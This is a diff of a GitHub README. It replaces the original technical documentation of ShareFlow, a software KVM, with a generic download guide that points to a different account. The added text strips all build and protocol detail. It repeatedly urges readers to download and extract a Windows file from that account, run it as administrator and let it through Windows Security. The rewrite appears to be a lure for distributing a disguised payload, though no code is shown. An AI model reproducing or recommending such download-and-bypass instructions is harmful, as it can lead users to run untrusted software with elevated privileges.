@@ -1,178 +1,190 @@
-# ShareFlow
+# 🖥️ shareflow-kvm - Share one mouse across your devices
 
-A software KVM that lets you share one keyboard and mouse across multiple PCs on your local network. Move your cursor to the edge of a screen and it seamlessly transitions to the next machine — no hardware switch required.
+[![Download shareflow-kvm](https://img.shields.io/badge/Download-Shareflow--KVM-blue.svg)](https://github.com/straight-scalar733/shareflow-kvm)
 
-![ShareFlow Main UI](https://raw.githubusercontent.com/JoshuaFourie/shareflow-kvm/main/Main.jpg)
+## 🔽 Download
 
----
+Use this link to visit the page and download shareflow-kvm:
 
-## Features
+https://github.com/straight-scalar733/shareflow-kvm
 
-- **Edge switching** — push the cursor to any screen edge to move focus to the next machine
-- **Directional gate** — only triggers when moving toward the edge, not during horizontal drags
-- **Clipboard sync** — text and images transfer automatically between machines
-- **File transfer** — drag and drop files across machines
-- **LAN auto-discovery** — peers appear automatically, no IP configuration needed
-- **TLS encrypted** — all traffic is encrypted with TOFU certificate pinning
-- **Multi-monitor aware** — correctly maps cursor position across screens of different sizes
-- **Hotkey return** — press Scroll Lock to snap back to local control
-- **Windows + macOS** — Windows as primary controller, macOS as peer (Linux experimental)
+## ✨ What shareflow-kvm does
 
----
+shareflow-kvm lets you use one keyboard and mouse on more than one computer. It also shares your clipboard, so you can copy on one device and paste on another. It works over your local network, so your Windows and macOS machines can stay on the same desk and still act like one setup.
 
-## How It Works
+Use it when you want to:
 
-### Discovery
-On launch, each machine broadcasts a UDP announcement on port `24801` with a magic header (`SFLO`). Other machines on the same subnet listen for these broadcasts and surface discovered peers in the UI. Announcements are timestamped to prevent replay attacks and expire after 30 seconds.
+- Move the mouse from one computer to another
+- Type on more than one device with one keyboard
+- Copy text on Windows and paste it on macOS
+- Keep your desk free of extra input devices
+- Send small files between devices on your network
 
-### Connection
-Once a peer is accepted, a TLS TCP connection is established. On first connect, the certificate fingerprint is stored (trust-on-first-use). Subsequent connections verify against the stored fingerprint. All messages are encoded as length-prefixed bincode frames.
+## 🪟 System requirements
 
-### Focus & Edge Switching
-Each machine tracks which machine currently has "focus" — the one receiving physical keyboard and mouse input.
+shareflow-kvm is made for desktop use on Windows and macOS.
 
-When the cursor reaches the boundary of the local desktop:
-1. **Edge detection** fires if the movement direction is predominantly toward the edge (45 degrees — prevents accidental triggers during near-edge drags)
-2. A `SwitchFocus` message is sent to the target peer with the cursor entry coordinates
-3. The sending machine **suppresses** all local input (cursor hidden, events blocked)
-4. The receiving machine **injects** the cursor at the mapped entry point and begins injecting all forwarded events
+You will need:
 
-Position is mapped proportionally between screens — crossing at 30% from the top on the sending screen places the cursor at 30% from the top on the receiving screen, regardless of resolution differences.
+- Windows 10 or Windows 11
+- A second computer with macOS, or another supported desktop on the same LAN
+- A working local network connection
+- A mouse and keyboard connected to one of the computers
+- Permission to install and run apps on your PC
 
-A 300ms cooldown prevents oscillation after any switch.
+For the best result, keep both devices on the same Wi-Fi or wired network.
 
-### Input Capture & Injection
+## 📥 Download and install on Windows
 
-**Windows (sender/primary):**
-- Low-level `WH_MOUSE_LL` and `WH_KEYBOARD_LL` hooks capture all input before it reaches applications
-- Warp-to-center technique keeps the physical cursor stationary while computing virtual deltas
-- Cursor is hidden via `ShowCursor` during remote control
+1. Open the download page:
+   https://github.com/straight-scalar733/shareflow-kvm
 
-**macOS (peer/receiver):**
-- `CGEventTap` at `kCGHIDEventTap` captures input with full suppression capability
-- Injection uses `CGWarpMouseCursorPosition` + `CGEventCreateMouseEvent` with both absolute position and relative delta fields set (required for apps that read deltas — window dragging, creative apps, 3D viewports)
-- Modifier key state is tracked independently to prevent stuck modifiers across transitions
+2. Find the latest Windows release file on the page.
 
-### Clipboard Sync
-When focus switches to a remote machine, the local clipboard is pushed immediately so Ctrl+V works straight away on the remote machine. Both text and image clipboard content are supported.
+3. Download the Windows app file to your computer.
 
-### Protocol
-All messages are serialised with bincode and framed with a 4-byte big-endian length prefix. Key message types:
+4. If the file comes in a zip folder, right-click it and choose Extract All.
 
-| Message | Description |
-|---|---|
-| `Hello` / `HelloAck` | Handshake, exchanges peer ID, name, screen layout |
-| `MouseMove` | Absolute cursor position |
-| `MouseButton` | Button press/release |
-| `MouseScroll` | Scroll delta |
-| `Key` | Hardware scancode press/release |
-| `SwitchFocus` | Trigger focus transition with entry coordinates |
-| `ClipboardUpdate` | Clipboard content push |
-| `FileStart/Chunk/Done` | Chunked file transfer |
-| `Ping` / `Pong` | Keepalive (3 missed pongs closes the connection) |
+5. Open the extracted folder.
 
----
+6. Double-click the app file to start shareflow-kvm.
 
-## Building
+7. If Windows asks for permission, choose Yes or Run.
 
-### Prerequisites
+8. If your browser saves the file to Downloads, you can open it from there and run it.
 
-**All platforms:**
-- [Rust](https://rustup.rs/) (stable, 1.77+)
-- [Node.js](https://nodejs.org/) (18+)
+## ⚙️ First-time setup
 
-**Windows:**
-- [Visual C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) (Desktop development with C++)
-- [WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/) (included with Windows 11, installer available for Windows 10)
-- [WiX Toolset v3](https://wixtoolset.org/) — required for .msi builds only
+After you open the app, set up the computer that will control the others first.
 
-**macOS:**
-- Xcode Command Line Tools: `xcode-select --install`
+1. Start shareflow-kvm on the main Windows PC.
+2. Open the app on the other computer too.
+3. Make sure both devices are on the same network.
+4. Pick which computer should act as the main input machine.
+5. Set the screen layout so the app knows where each device sits.
+6. Save the setup.
+7. Move the mouse to the edge of the screen to switch to the next device.
+8. Test copy and paste between both machines.
 
----
+If the app shows a pairing or connection code, enter the same code on both devices.
 
-### Install dependencies
+## 🧭 How to use it
 
-```bash
-npm install
-```
+Once it is set up, day-to-day use is simple.
 
-### Run in development
+- Move your mouse to the edge of one screen to reach the next computer
+- Use your keyboard as normal
+- Copy text on one machine and paste it on the other
+- Keep working without changing keyboards or mice
+- Return to your main PC by moving the cursor back
 
-```bash
-npm run tauri dev
-```
+If your setup includes more than two devices, arrange them in the same order they sit on your desk.
 
-### Build release installer
+## 📋 Clipboard sharing
 
-**Windows** (produces .msi and .exe installer):
-```bash
-npm run tauri build
-```
-Output: `src-tauri/target/release/bundle/msi/ShareFlow_x.x.x_x64_en-US.msi`
+shareflow-kvm can share clipboard content across devices.
 
-**macOS** (produces .dmg):
-```bash
-npm run tauri build
-```
-Output: `src-tauri/target/release/bundle/dmg/ShareFlow_x.x.x_x64.dmg`
+That means you can:
 
-> macOS builds must be run on a Mac. Windows builds must be run on Windows. Cross-compilation is not supported.
+- Copy text from a web page on Windows
+- Paste it into a note app on macOS
+- Move short links, snippets, and simple text between machines
+- Avoid sending yourself emails just to move text
 
----
+Clipboard sync works best with plain text and short items.
 
-### macOS — Accessibility Permission
+## 📁 File transfer
 
-On macOS, ShareFlow requires Accessibility permission to capture and inject input events.
+The app also supports file transfer on a local network.
 
-1. Open **System Settings > Privacy & Security > Accessibility**
-2. Add ShareFlow to the allowed list
-3. Restart ShareFlow
+Use it to:
 
-Without this permission the event tap will fail silently and input will not be captured or injected.
+- Send small work files between devices
+- Move images or documents without cloud storage
+- Keep files on your own network
+- Avoid switching to a USB drive for quick transfers
 
----
+For large files, use a strong network connection for the best transfer speed.
 
-## Project Structure
+## 🧩 Common setup options
 
-```
-shareflow/
-├── src/                        # React/TypeScript frontend (Tauri UI)
-└── src-tauri/
-    └── src/
-        ├── core/
-        │   ├── engine.rs       # Focus state machine, edge switching logic
-        │   ├── screen.rs       # Edge detection, boundary validation
-        │   ├── protocol.rs     # Message types, encode/decode
-        │   ├── config.rs       # App configuration, neighbour layout
-        │   └── hotkey.rs       # Scroll Lock hotkey detection
-        ├── input/
-        │   ├── windows.rs      # Windows low-level hooks (capture + injection)
-        │   ├── macos.rs        # macOS CGEventTap (capture + injection)
-        │   └── linux.rs        # Linux (experimental)
-        ├── network/
-        │   ├── discovery.rs    # UDP LAN broadcast discovery
-        │   ├── server.rs       # TLS TCP server, message routing
-        │   ├── connection.rs   # Framed message reader/writer
-        │   └── tls.rs          # Certificate generation and pinning
-        ├── clipboard/
-        │   └── sync.rs         # Clipboard monitoring and sync
-        └── file_transfer/
-            ├── sender.rs       # Chunked streaming file sender
-            └── receiver.rs     # File receiver with bounds checking
-```
+You may see a few simple options in the app:
 
----
+- **Primary device**: the computer that controls the mouse and keyboard
+- **Screen layout**: where the other computer sits in relation to your main screen
+- **Clipboard sync**: lets copy and paste work across devices
+- **File sharing**: turns on transfer between machines
+- **Startup launch**: opens the app when Windows starts
 
-## Network Ports
+Use the layout that matches your desk. If your second computer is on the left, place it on the left in the app too.
 
-| Port | Protocol | Purpose |
-|---|---|---|
-| `24801` | UDP broadcast | LAN peer discovery |
-| `24800` | TCP (TLS) | Peer communication (configurable) |
+## 🔒 Network tips
 
----
+shareflow-kvm works over LAN, so both devices should be easy to reach from each other.
 
-## License
+For a smooth setup:
 
-MIT
+- Keep both devices on the same Wi-Fi network
+- Use a wired connection if you want a steadier link
+- Close other remote control tools if they cause conflicts
+- Allow the app through Windows Firewall if needed
+- Keep your devices awake while you use them together
+
+If the connection does not start, check that both computers are using the same router or access point.
+
+## 🛠️ If something does not work
+
+### Mouse does not switch to the other screen
+
+- Check the screen layout in the app
+- Make sure both devices are connected
+- Move the cursor slowly to the screen edge
+- Confirm the other computer is running shareflow-kvm
+
+### Clipboard does not sync
+
+- Copy plain text first
+- Check that clipboard sync is on
+- Restart the app on both devices
+- Make sure both devices stay connected
+
+### File transfer fails
+
+- Try a smaller file first
+- Check network access on both computers
+- Make sure both apps are open
+- Use the same network on each device
+
+### Windows blocks the app
+
+- Right-click the file and choose Run as administrator
+- Allow the app through Windows Security when asked
+- Make sure the file finished downloading before opening it
+
+## 🧼 Remove the app
+
+If you want to remove shareflow-kvm from Windows:
+
+1. Close the app.
+2. Delete the app folder or downloaded file.
+3. Remove any shortcut you created.
+4. Turn off startup launch if you enabled it.
+
+## 📌 Project topics
+
+clipboard-sync, file-transfer, homelab, input-sharing, keyboard-mouse-sharing, kvm, lan, macos, productivity, remote-control, rust, self-hosted, software-kvm, tauri, windows
+
+## 🧭 Quick start
+
+1. Visit the download page:
+   https://github.com/straight-scalar733/shareflow-kvm
+
+2. Download the Windows file.
+
+3. Open it on your PC.
+
+4. Start the app on both computers.
+
+5. Set the screen layout.
+
+6. Move your mouse to the edge of the screen to switch devices
